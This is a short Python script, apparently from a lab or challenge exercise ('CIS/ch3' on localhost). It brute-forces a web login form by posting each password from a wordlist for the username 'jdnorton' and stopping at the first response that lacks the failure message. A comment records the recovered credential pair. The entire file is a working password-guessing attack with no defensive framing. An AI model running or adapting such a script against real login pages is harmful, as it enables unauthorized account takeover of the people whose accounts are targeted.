import requests

passwords = open("users.txt", 'r').read().split('\n')

def Ch3(url, password):
    data = {
        "username": "jdnorton",
        "password": password,
        "login": "Login"
        }
    req = requests.post(url, data).text
    if "Invalid Username OR Password" in req:
        print(f"Invalid Password ===> {password}")
    else:
        print(f"Valid Password ===> {password}") #jdnorton : marquardtj
        exit()
    
url = "http://localhost/CIS/ch3/login.php"
for password in passwords:
    Ch3(url, password)